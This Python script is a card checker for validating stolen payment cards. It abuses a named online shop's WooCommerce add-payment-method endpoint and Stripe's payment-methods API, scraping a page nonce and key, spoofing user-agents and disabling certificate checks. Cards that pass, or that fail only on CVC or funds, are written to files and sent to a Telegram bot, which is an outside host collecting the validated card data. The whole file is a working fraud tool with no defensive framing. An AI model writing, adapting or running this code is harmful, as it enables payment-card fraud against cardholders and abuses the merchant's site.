import requests
import re
import uuid
import time
from user_agent import generate_user_agent
import urllib3
import logging

# Disable warnings for insecure requests (if needed)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger()

API_URL = "https://artcornucopia.com/my-account/add-payment-method/"
STRIPE_URL = "https://api.stripe.com/v1/payment_methods"

def generate_uuids():
    """Generate reusable UUIDs for session."""
    return {
        "gu": uuid.uuid4(),
        "mu": uuid.uuid4(),
        "si": uuid.uuid4()
    }

def prepare_headers():
    """Prepare headers with a generated user-agent."""
    user_agent = generate_user_agent()
    return {
        'user-agent': user_agent,
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/'
    }

def send_telegram_message(message, chat_id, bot_token):
    """Send a message to Telegram chat."""
    try:
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        data = {"chat_id": chat_id, "text": message}
        requests.post(url, data=data, timeout=500)
    except Exception as e:
        logger.error(f"Telegram send message error: {e}")

def fetch_nonce_and_key(headers, retries=3, delay=1):
    """Fetch nonce and key from API_URL with retries."""
    for attempt in range(retries):
        try:
            resp = requests.get(API_URL, headers=headers, verify=False, timeout=10)
            if resp.status_code == 200:
                nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', resp.text)
                key_match = re.search(r'"key":"(.*?)"', resp.text)
                if nonce_match and key_match:
                    return nonce_match.group(1), key_match.group(1)
        except Exception as e:
            logger.warning(f"Nonce/key fetch attempt {attempt+1} failed: {e}")
        time.sleep(delay)
    return None, None

def process_single_card(card_data, headers, uuids, chat_id, bot_token):
    """
    Process a single card string: card|month|year|cvc
    Returns: (status_category, telegram_message, raw_card)
    """
    nonce, key = fetch_nonce_and_key(headers)
    if not nonce or not key:
        msg = f"Skipped {card_data} (missing nonce/key)"
        logger.error(msg)
        return "DECLINED", msg, card_data

    try:
        number, exp_month, exp_year, cvc = card_data.split('|')
        exp_year = exp_year[-2:]  # last two digits
    except Exception:
        msg = f"Invalid format: {card_data}"
        logger.error(msg)
        return "INVALID_FORMAT", msg, card_data

    stripe_data = {
        'type': 'card',
        'card[number]': number,
        'card[cvc]': cvc,
        'card[exp_year]': exp_year,
        'card[exp_month]': exp_month,
        'guid': str(uuids["gu"]),
        'muid': str(uuids["mu"]),
        'sid': str(uuids["si"]),
        'key': key,
        '_stripe_version': '2024-06-20',
    }

    try:
        stripe_resp = requests.post(STRIPE_URL, headers=headers, data=stripe_data, verify=False, timeout=15)
        stripe_resp.raise_for_status()
        stripe_json = stripe_resp.json()
        payment_method_id = stripe_json.get('id')
        if not payment_method_id:
            raise ValueError("No payment method ID in Stripe response")
    except Exception as e:
        msg = f"Stripe token error for {card_data}: {e}"
        logger.error(msg)
        return "DECLINED", msg, card_data

    setup_data = {
        'action': 'create_and_confirm_setup_intent',
        'wc-stripe-payment-method': payment_method_id,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': nonce,
    }

    try:
        confirm_resp = requests.post(
            API_URL,
            params={'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'},
            headers=headers,
            data=setup_data,
            verify=False,
            timeout=15
        )
        confirm_resp.raise_for_status()
        resp_json = confirm_resp.json()
        success = resp_json.get('success', False)

        if success:
            message = f"AUTH {card_data}"
            send_telegram_message(message, chat_id, bot_token)
            with open('AUTH.txt', 'a') as f:
                f.write(f"{card_data}\n")
            return "CHARGED", message, card_data

        text = confirm_resp.text
        if "Your card's security code is incorrect." in text:
            message = f"Incorrect CVC {card_data}"
            send_telegram_message(message, chat_id, bot_token)
            with open('IncorrectCVC.txt', 'a') as f:
                f.write(f"{card_data}\n")
            return "CVV", message, card_data

        if "Your card has insufficient funds." in text:
            message = f"Insufficient {card_data}"
            send_telegram_message(message, chat_id, bot_token)
            with open('Insuff.txt', 'a') as f:
                f.write(f"{card_data}\n")
            return "LOW_FUNDS", message, card_data

        # Other errors
        error_msg = resp_json.get('data', {}).get('error', {}).get('message', 'Unknown error')
        message = f"DEAD {card_data} >> {error_msg}"
        return "DECLINED", message, card_data

    except Exception as e:
        msg = f"Setup intent error for {card_data}: {e}"
        logger.error(msg)
        return "DECLINED", msg, card_data